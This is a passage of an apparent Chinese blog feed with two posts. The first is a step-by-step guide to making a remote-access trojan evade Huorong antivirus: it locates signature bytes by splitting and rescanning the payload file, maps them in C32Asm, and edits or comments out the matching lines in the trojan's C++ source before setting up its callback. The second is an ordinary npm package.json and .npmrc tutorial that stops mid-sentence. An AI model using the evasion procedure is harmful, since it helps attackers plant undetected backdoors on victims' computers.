        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在研究  <code>免杀</code> 内的问题，碰到一些相关问题，算是整理一下。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>远控源代码免杀过火绒，基于国内的杀毒软件的<code>特征检查</code>，大多数都是用的<code>特征库</code>类的去检查。</p><p><code>360</code>的云引擎比较厉害，感觉<code>火绒</code>有点low。</p><h3 id="杀毒原理解析"><a href="#杀毒原理解析" class="headerlink" title="杀毒原理解析"></a>杀毒原理解析</h3><p>国内比较出名的有<code>360</code>、<code>腾讯电脑管家</code>、<code>火绒</code>、<code>金山毒霸</code>、<code>瑞星</code>等等，这几个杀毒软件，国内大多数应该都是<code>火绒</code>和<code>360</code></p><p>国外的比较出名的<code>火眼</code>，<code>诺顿</code>，<code>卡巴</code>，<code>微软</code>自带的那个，</p><p>现在的杀毒软件都无法脱离三个部分，<code>扫描器</code>、<code>病毒库</code>、<code>虚拟机</code>。</p><p>然而一个杀毒软件做的是否好用，最主要的还是扫描器的速度、准确率以及病毒库是否庞大。</p><h3 id="基于特征码的静态扫描技术"><a href="#基于特征码的静态扫描技术" class="headerlink" title="基于特征码的静态扫描技术"></a>基于特征码的静态扫描技术</h3><p>这种技术很容易被人想到，所以第一代的杀毒软件出现了，他们的杀毒思想就是，</p><p>我只要在特征库中匹配到已知的病毒特征字符串（一般都是 <code>MD5值</code> ）就可以判断出来这个文件是一个病毒。</p><p>但这种方法在当今病毒技术迅猛发展的形势下已经起不到很好的作用了。不好用就是已经过时了 <code>火绒</code>就是</p><p>用的这种技术。</p><h3 id="基于特征码的云引擎查杀技术"><a href="#基于特征码的云引擎查杀技术" class="headerlink" title="基于特征码的云引擎查杀技术"></a>基于特征码的云引擎查杀技术</h3><p>国内 <code>360</code> 的云引擎查杀不得不说是真的厉害。 <code>云引擎</code>查杀，顾名思义就是扫描一个文件，带入到云端去扫描</p><p>360属于驱动级别的查杀，驱动级别简单理解：打个比方，你电脑中安装了360，它会监控你整个电脑的所有程序，</p><p>你的任务管理器里面的所有程序，包括程序后面续执行所有危险的操作，它都会监控。我记得以前打游戏的时候，</p><p>启动游戏360会自动进入一个游戏模式，360在平时会很占你的内存，因为360也会监控内存。</p><p>360 能检测驱动程序，内存，可执行程序。基本上360能监测很多了，它是基于云引擎查杀的，而火绒是基于特征库</p><p>监测的。</p><h3 id="我所认知能拿shell的木马"><a href="#我所认知能拿shell的木马" class="headerlink" title="我所认知能拿shell的木马"></a>我所认知能拿shell的木马</h3><p>个人现在所知道能拿shell的木马可分为：<code>网马</code>、<code>驱动马</code>、<code>内存马</code>、<code>可执行程序马</code>、</p><p><code>网马</code>：<code>网马</code>就是上传到web服务器里面，主要以拿到webshell。</p><p><code>驱动马</code>：听名字应该知道它的意思。简单理解就是，你的电脑启动的时候会启动驱动程序，而别人在你的驱动里面植入了木马，你启动电脑的时候，木马也会自动运行。</p><p><code>内存马</code>：内存马原理大概上跟驱动马类似</p><p><code>可执行程序马</code>：在你启动，或者点开执行一个程序的时候，它才回运行。一般来说你只要不点开它就没事儿。</p><p><code>木马</code>其实就是执行一些<code>高危</code>的操作，或者是执行一些<code>高危</code>的权限的程序，木马在执行的时候会触<code>发行为特征</code>，本偏介绍的<br>就是如何过<code>火绒免杀</code>。</p><h3 id="远控源码免杀"><a href="#远控源码免杀" class="headerlink" title="远控源码免杀"></a>远控源码免杀</h3><h4 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h4><p>先生成一个木马.<br><img src="1.png"></p><h4 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h4><p>查看查杀情况.可以看到报了风险详情.<br><img src="2.png"></p><h4 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h4><p>下面来进行免杀.<br>fuck.dat 是远控生成木马的文件，把.dat免杀了，文件下面生成的所有小马都会免杀。<br>点开工具导入.dat文件，分块数量修改掉，点生成。<br><img src="3.png"></p><h4 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h4><p>在文件夹中会有生成的20个文件，把它全部选中，右键查杀。<br><img src="4.png"></p><h4 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h4><p>会发现有三个风险，给它处理掉。说明有三个是有木马特征的<br><img src="5.png"></p><h4 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h4><p>点击二次处理，会在生成20个文件，然后再右键查杀会发现，未发现风险。说明这20个文件里面是没有特征的<br><img src="6.png"></p><h4 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h4><p>特征区间会显示一个特征，但是这个不是他真实的特征。因为我们要定位到它后面的两位数或者三位数<br><img src="7.png"></p><h4 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h4><p>右键复合定位，分块数量还是改成20，不然会生成很多个，不好定位。<br><img src="8.png"></p><h4 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h4><p>复合定位后会生成后，还是一样接着在文件夹中查杀。在点击二次处理，一直二次处理，直到查不出来。<br><img src="9.png"></p><h4 id="0x2x1"><a href="#0x2x1" class="headerlink" title="0x2x1"></a>0x2x1</h4><p>特征区间会出现两个特征码，接着复合定位。接着改成生成20，然后在查杀，在二次处理，直到查不出来。<br><img src="10.png"></p><h4 id="0x2x2"><a href="#0x2x2" class="headerlink" title="0x2x2"></a>0x2x2</h4><p>一直复合定位，生成，查杀，二次处理，查杀。复合定位，生成，查杀，二次处理，查杀<br>直到查杀不出来，特征区间的特征码为002结尾，长度为2。  这个就是我们查杀出来的特征码<br>保存下来。<br><img src="11.png"></p><h4 id="0x2x3"><a href="#0x2x3" class="headerlink" title="0x2x3"></a>0x2x3</h4><p>打开C32Asm，把.dat文件导入进去，辅助我们查找，输入刚才查到的两个特征码，看查杀的哪些地方。<br><img src="12.png"><br><img src="13.png"></p><h4 id="0x2x4"><a href="#0x2x4" class="headerlink" title="0x2x4"></a>0x2x4</h4><p>把.dsw文件导入vc中，应为这款远控是c++写的，我们导入的这个文件，它是这款程序生服务端和客户端的源文件，<br>查找ServerDll，因为我们特征定位是查出来这两个位置被杀了。直接查找<br><img src="14.png"></p><h4 id="0x2x5"><a href="#0x2x5" class="headerlink" title="0x2x5"></a>0x2x5</h4><p>在vc中查找刚才我们被杀的两个地方。<br><img src="15.png"><br><img src="16.png"></p><h4 id="0x2x6"><a href="#0x2x6" class="headerlink" title="0x2x6"></a>0x2x6</h4><p>第一个改掉相关的关键字，第二个直接注释掉，没什么用的鸡肋功能。<br><img src="18.png"><br><img src="19.png"></p><h4 id="0x2x7"><a href="#0x2x7" class="headerlink" title="0x2x7"></a>0x2x7</h4><p>最终版本，加上线。<br><img src="20.png"><br><img src="21.png"></p>]]></content>
      
      
      <categories>
          
          <category> -免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm,看这篇就够了</title>
      <link href="/2020/02/29/npm-kan-zhe-pian-jiu-gou-liao/"/>
      <url>/2020/02/29/npm-kan-zhe-pian-jiu-gou-liao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在研究  <code>npm</code> 组件发布，碰到一些相关问题，算是整理一下。</p><h3 id="涉及内容"><a href="#涉及内容" class="headerlink" title="涉及内容"></a>涉及内容</h3><ul><li>package.json 文件介绍</li><li>.npmrc 的作用及配置</li><li>公网 npm 组件发布</li></ul><h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>package.json 定义了当前项目中 <code>npm包</code> 之间的依赖关系和项目的一些配置信息（项目名称，版本，描述，开发人，许可证 等等）。</p><p>当说到包管理器，就会遇到 <code>yarn</code> 和 <code>npm</code> 的选择性问题。我是喜欢用 <code>yarn</code><br>的，看看 <code>github</code> 上的开源项目，比如 <code>vue</code> 项目下就有 <code>yarn.lock</code> 文件，由此我猜测 <code>yarn</code> 可能更受欢迎一些，日常使用中我也是 <code>yarn</code> 用的比较多。 </p><p>当我们 <code>npm install</code> 或 <code>yarn install</code> 会根据项目下的 <code>package.json</code> 解析依赖包之间的依赖关系然后从配置的 <code>npm registry</code> （ <code>.npmrc</code> 可以配置对应的 <code>registry</code>）地址中搜索并下载包。</p><p>我们可以在 <code>yarn.lock</code> 或 <code>package-lock.json</code> 看到包从哪里下载和依赖关系。</p><p>提交代码的时候排除 <code>node_modules</code> 目录，但是要提交 <code>yarn.lock</code> 或 <code>package-lock.json</code> ,用于锁定项目依赖包的版本。并且升级包的时候不要手动改 <code>package.json</code> 中的版本号，要使用命令 <code>yarn upgrade</code> 或 <code>npm upgrade </code> 升级。</p><p><code>npm init</code> 或 <code>yarn init</code> 可以生成 package.json。</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"@mflyyou/npm-description"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span><span class="token punctuation">,</span>    <span class="token property">"private"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">"jadelin"</span><span class="token punctuation">,</span>    <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"MIT"</span><span class="token punctuation">,</span>    <span class="token property">"main"</span><span class="token operator">:</span><span class="token string">"index.js"</span><span class="token punctuation">,</span>    <span class="token property">"keywords"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"npm 搜索关键词"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"publishConfig"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"registry"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.com/"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"repository"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"git"</span><span class="token punctuation">,</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://git.com/项目git地址"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"files"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"dist"</span><span class="token punctuation">,</span>        <span class="token string">"src"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"bugs"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://localhost:8080//issues"</span><span class="token punctuation">,</span>        <span class="token property">"email"</span><span class="token operator">:</span> <span class="token string">"bug@example.com"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"contributors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"xiaozhan"</span><span class="token punctuation">,</span>            <span class="token property">"email"</span><span class="token operator">:</span> <span class="token string">"694615432@qq.com"</span>        &amp;#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"scripts"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"dev"</span><span class="token operator">:</span> <span class="token string">"sh ./build/build.sh"</span><span class="token punctuation">,</span>        <span class="token property">"npm-version"</span><span class="token operator">:</span> <span class="token string">"npm -v"</span><span class="token punctuation">,</span>        <span class="token property">"serve"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service serve"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"dependencies"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"vue"</span><span class="token operator">:</span> <span class="token string">"^2.5.21"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"devDependencies"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"@vue/cli-plugin-babel"</span><span class="token operator">:</span> <span class="token string">"^3.3.0"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token property">"peerDependencies"</span><span class="token operator">:</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="package-json-字段介绍"><a href="#package-json-字段介绍" class="headerlink" title="package.json 字段介绍"></a>package.json 字段介绍</h3><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p><code>name</code> 字段作为项目的名称。 比如 vue 中的一个组件 <code>@vue/cli-plugin-babel</code> ，前面这个 <code>@vue</code> 其实就当前包的 scope ，既命名空间。我们可以根据 <code>scope</code> 配置一些私有包 <code>registry</code>，从而达到一些包来源于特定的地址。</p><pre class="line-numbers language-txt"><code class="language-txt">registry=https://registry.npm.taobao.org/@pay-plugin:registry=https://npm.udolphin.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="version"><a href="#version" class="headerlink" title="version"></a>version</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> version <span class="token punctuation">[</span><span class="token operator">&lt;</span>newversion<span class="token operator">></span> <span class="token operator">|</span> major <span class="token operator">|</span> minor <span class="token operator">|</span> patch <span class="token operator">|</span> premajor <span class="token operator">|</span> preminor <span class="token operator">|</span> prepatch <span class="token operator">|</span> prerelease <span class="token punctuation">[</span>--preid<span class="token operator">=</span><span class="token operator">&lt;</span>prerelease-id<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">|</span> from-git<span class="token punctuation">]</span><span class="token string">'npm [-v | --version]'</span> to print <span class="token function">npm</span> version<span class="token string">'npm view &lt;pkg> version'</span> to view a package<span class="token string">'s published version'</span><span class="token function">npm</span> ls' to inspect current package/dependency versions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> “version”: “0.1.0”, 对应 <code>major-minor-patch</code> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 更新 major 的位置，其余位置为 0</span><span class="token function">npm</span> version major <span class="token comment" spellcheck="true"># 更新 minor 的位置，major 不变，其余位置为 0</span><span class="token function">npm</span> version minor <span class="token comment" spellcheck="true"># 更新 patch 的位置，其余位置不变</span><span class="token function">npm</span> version patch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>major 对应一次大的迭代，比如 vue 3.0 ts 重新，添加新的功能，更新 major 版本号</li><li>minor 对应小版本迭代，发生兼容旧版API的修改或功能添加时，更新 minor 版本号</li><li>patch 对应修订版本号，一般针对 bug 修复时，修改 patch 的版本号</li></ul><p>当你的项目需要发布的时候，version 一定要和以前的不一样，否则发布不成功。</p><h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p>标识当前包是否私有，为 <code>true</code> 时包不能发布。</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>默认 index.js。指定 import 或 require 的时候加载的 js。</p><h4 id="keywords"><a href="#keywords" class="headerlink" title="keywords"></a>keywords</h4><p>描述当前项目的关键字，用于检索当前插件。</p><h4 id="publishConfig"><a href="#publishConfig" class="headerlink" title="publishConfig"></a>publishConfig</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"publishConfig"</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token string">"registry"</span><span class="token punctuation">:</span> <span class="token string">"https://registry.npmjs.com/"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>有的时候呢我们在 <code>.npmrc</code> 配置了别的 <code>registry</code> ，比如淘宝镜像。我安装依赖包的时候呢，想从淘宝镜像安装。发布插件的时候想发布到官网上。就可以在 <code>publishConfig</code> 中配置了。 </p><h4 id="files"><a href="#files" class="headerlink" title="files"></a>files</h4><p>指定发布的依赖包，包含的文件，默认会忽略一些文件。也可以根目录下创建 .npmignore 忽略一些文件。</p><p><img src="http://oss.mflyyou.cn/blog/20200304021818.png"></p><h4 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h4><p>配置一些执行脚本。比如说 <code>npm run dev</code> 就是运行 <code>sh ./build/build.sh</code>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 运行 shell 脚本</span>    <span class="token string">"dev"</span><span class="token punctuation">:</span> <span class="token string">"sh ./build/build.sh"</span><span class="token punctuation">,</span>    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"npm -v"</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// build 成功之后会执行 publish    </span>    <span class="token string">"pub"</span><span class="token punctuation">:</span> <span class="token string">"npm run build &amp;&amp; npm publish"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h4><p>项目的开发依赖。key 为模块名称，value 为版本范围。项目打包时会将这里的依赖打包进去。</p><p><a href="https://github.com/wanguzhang/fly-npm">fly-npm 地址</a></p><p>fly-npm 和 fly-use-npm 已发布。</p><p>注意，这里也有个坑。比如我有两个插件 fly-npm，fly-use-npm，fly-use-npm 中 dependencies 中依赖 fly-npm。我在 my-vue 项目开发的时候引入 fly-use-npm。我是可以直接 <code>import fly-use-npm</code> 项目可以正常运行。但是当你 <code>import fly-npm</code>  项目解析依赖会报错。因为只有在当前项目中 dependencies 引入的依赖才可以被 import。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"clickTest"</span><span class="token operator">></span>            测试        <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token comment" spellcheck="true">// fly-npm 只有在当前 my-vue 项目 dependencies 引入才可以被 import</span><span class="token comment" spellcheck="true">//import flyNpm from 'fly-npm';    </span><span class="token keyword">import</span> flyUseNpm <span class="token keyword">from</span> <span class="token string">'fly-use-npm'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    name<span class="token punctuation">:</span> <span class="token string">'TestPlugin'</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">clickTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token function">flyUseNpm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="devDependencies"><a href="#devDependencies" class="headerlink" title="devDependencies"></a>devDependencies</h4><p>为开发依赖，打包的时候不会打包进去。比如我们使用的 <code>babel</code> <code>webpak</code> 等相关的插件，打包的时候，并不会被打包进去。</p><h4 id="peerDependencies"><a href="#peerDependencies" class="headerlink" title="peerDependencies"></a>peerDependencies</h4><p>在将这个之前，我们先来了解 npm 的树形依赖是什么意思。</p><p>我创建一个 vue 项目 my-vue 依赖 fly-use-npm(它依赖 fly-npm 1.0.0)，fly-npm(2.0.0)，在我们项目中可以看到。</p><p>当 <code>my-vue</code> 没有引入 <code>fly-npm 2.0.0</code> 的时候，<code>my-vue/node_modules/fly-npm</code> 为 1.0.0。</p><p><img src="http://oss.mflyyou.cn/blog/20200304021831.png"></p><p>当我们引入 <code>fly-npm 2.0.0</code> 的时候，依赖关系图如上图，这就是树形依赖。</p><p>下面是测试引入 <code>fly-npm 2.0.0</code> 之后的变化。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"clickTest"</span><span class="token operator">></span>            测试        <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">import</span> flyUseNpm <span class="token keyword">from</span> <span class="token string">'fly-use-npm'</span><span class="token punctuation">;</span><span class="token keyword">import</span> flyNpm <span class="token keyword">from</span> <span class="token string">'fly-npm'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    name<span class="token punctuation">:</span> <span class="token string">'TestPlugin'</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">clickTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 打印 2.0.0</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fly-npm'</span><span class="token punctuation">,</span> flyNpm<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 使用的是 1.0.0</span>            <span class="token function">flyUseNpm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面我们可以看到，一个项目存在了两份 fly-npm 的包。这样打包的体积相应也会增大。为了解决这个问题，引入了 <code>peerDependencies</code> 。</p><p>创建 vue 项目 my-vue，依赖 fly-use-npm(4.0.0,其 <code>peerDependencies</code> 是 fly-npm 1.0.0 )。</p><p><code>peerDependencies</code>  添加的依赖包，不会（测试的 yarn 1.22.0，npm 6.13.7）自动安装的。</p><p>当我在 my-vue 项目 <code>yarn install</code> 的时候，由于没有引入 <code>fly-npm</code> 会报错。</p><p>当我在项目中引入 <code>fly-npm 2.0.0</code> 安装会在当前项目下，出现警告信息。</p><blockquote><p>warning “ &gt; <a href="mailto:&#x66;&#x6c;&#121;&#45;&#x75;&#x73;&#x65;&#x2d;&#110;&#x70;&#109;&#64;&#52;&#x2e;&#48;&#x2e;&#x30;">&#x66;&#x6c;&#121;&#45;&#x75;&#x73;&#x65;&#x2d;&#110;&#x70;&#109;&#64;&#52;&#x2e;&#48;&#x2e;&#x30;</a>“ has incorrect peer dependency “<a href="mailto:&#x66;&#x6c;&#x79;&#x2d;&#x6e;&#x70;&#109;&#x40;&#49;&#46;&#48;&#46;&#48;">&#x66;&#x6c;&#x79;&#x2d;&#x6e;&#x70;&#109;&#x40;&#49;&#46;&#48;&#46;&#48;</a>”。</p></blockquote><p>当你开发一个组件，依赖特定包的版本就需要这样处理。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// fly-use-npm</span><span class="token keyword">import</span> flyNpm <span class="token keyword">from</span> <span class="token string">'fly-npm'</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'引用的 fly-npm 版本为:'</span><span class="token punctuation">,</span> flyNpm<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flyNpm<span class="token punctuation">.</span>version <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'版本大于 1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> obj<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>算是场景模拟，fly-npm 最新包是 2.0.0，这算是一个重大版本升级，可能存在不兼容 1.0.0 的东西。所以我在 fly-use-npm 推荐使用（peerDependencies）1.0.0。当我在实际用的时候呢，引入 fly-npm 2.0.0 ,发现某个功能依赖 fly-npm 2.0.0 报错了，就需要想到是不是依赖包不兼容的问题了。</p><p>但是同时你还想用 fly-npm 2.0.0 的功能，那你只能去提交一个 pr 兼容 fly-npm 或者 fly-use-npm 。</p><p>这种情况很少会遇到，一般版本升级都会兼容以前的功能的，也不用太在意这样的问题。</p><p>一般我们很少会遇到这种问题。<code>github</code> 上流行的库也很少会用到 <code>peerDependencies</code>。</p><h2 id="npmrc"><a href="#npmrc" class="headerlink" title=".npmrc"></a>.npmrc</h2><p><code>package.json</code> 中的依赖包从哪里安装呢？.npmrc 可以配置依赖包从哪里安装，也可以配置 npm 的一些别的配置。</p><h3 id="npmrc-配置文件优先级"><a href="#npmrc-配置文件优先级" class="headerlink" title=".npmrc 配置文件优先级"></a>.npmrc 配置文件优先级</h3><ul><li>项目配置文件: <code>/project/.npmrc</code></li><li>用户配置文件：<code>~/.npmrc</code></li><li>全局配置文件：<code>/usr/local/etc/npmrc</code></li><li>npm 内置配置文件 <code>/path/to/npm/npmrc</code></li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 获取 .npmrc 用户配置文件路径</span><span class="token function">npm</span> config get userconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>项目下 .npmrc 文件的优先级最高，可以每个项目配置不同的镜像，项目之间的配置互不影响。我们也可以指定特殊的命名空间（scope）的来源。</p><p>以<code>@thingjs-plugin</code> 开头的包从 <code>registry=https://npm.udolphin.com</code> 这里下载，其余全去淘宝镜像下载。</p><pre class="line-numbers language-txt"><code class="language-txt">registry=https://registry.npm.taobao.org/@thingjs-plugin:registry=https://npm.udolphin.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-txt"><code class="language-txt">npm config set <key> <value> [-g|--global]  //给配置参数key设置值为value；npm config get <key>                        //获取配置参数key的值；npm config delete <key>  [-g|--global]      //删除置参数key及其值；npm config list [-l]                        //显示npm的所有配置参数的信息；npm config edit                             //编辑用户配置文件npm get <key>                               //获取配置参数 key 生效的值；npm set <key> <value> [-g|--global]         //给配置参数key设置值为value；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有加 -g 